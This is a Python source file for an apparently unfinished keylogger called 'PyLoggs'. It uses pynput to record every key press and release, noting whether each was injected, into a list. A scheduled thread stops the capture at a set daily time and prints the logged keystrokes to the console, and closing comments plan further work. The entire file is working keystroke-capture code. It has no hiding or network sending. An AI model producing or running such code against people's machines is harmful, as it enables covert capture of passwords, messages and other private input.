import pygetwindow
import pynput
import threading
import time
import schedule



#class timer sets this
top_of_hour = 0


#@classmethod vvv method
class PyLoggs:
    #keystroke list
    keyList = []


    #class method to add key press to list
    @classmethod      #Key for spec keys or KeyCode for normal
    def on_press(cls, key, injected):
        try:
            key_press = 'alphanumeric key {} pressed; it was {}'.format(
                key.char, 'faked' if injected else 'not faked')
            #adding item to end of list
            PyLoggs.keyList.append(key_press)
        except AttributeError:
            key_press = 'special key {} pressed'.format(
                key)
            #adding item to end of list
            PyLoggs.keyList.append(key_press)


    @classmethod
    def on_release(cls, key, injected):
        key_release = '{} released; it was {}'.format(
            key, 'faked' if injected else 'not faked')
        #adding item to end of list
        PyLoggs.keyList.append(key_release)
        '''
        if key == pynput.keyboard.Key.esc:
            # Stop listener
            return False
        '''

    #main method for listen
    @classmethod
    def board_listen(cls):
        #here we will start our non-blocking listener and then while loop check fo the global variable with a momentary sleep to not spam cpu
        my_key_lstnr = pynput.keyboard.Listener(
            on_press=PyLoggs.on_press,
            on_release=PyLoggs.on_release)
        my_key_lstnr.start()#start listener

        #while loop to check for global var
        global top_of_hour
        while top_of_hour != 1:
            time.sleep(0.5)
        my_key_lstnr.stop()#stop listener



class timer:
    @staticmethod
    @schedule.repeat(schedule.every().day.at("10:23"))
    def time_counter_set():
        global top_of_hour
        top_of_hour = 1
        #test print out logs
        for key in PyLoggs.keyList:
            print(f'List -> {key}')

    @classmethod
    def run_my_scedule(cls):
        #looping to check the time
        while True:
            schedule.run_pending()
            time.sleep(1)


##########################################


def main():
    t_timer = threading.Thread(target=timer.run_my_scedule, args=())
    t_loggs = threading.Thread(target=PyLoggs.board_listen, args=())
    t_timer.start()
    t_loggs.start()
    t_timer.join()
    t_loggs.join()

    print("got too soon")


if __name__ == "__main__":
    main()

'''
Current Workflow
    > Lets modify the timer class to post that var at the top of the hour (custom time for now)

    > Lets just autorun for now till we get the params correct
    > We get the sceduler running correctly
    > Now we just need to figure out
'''
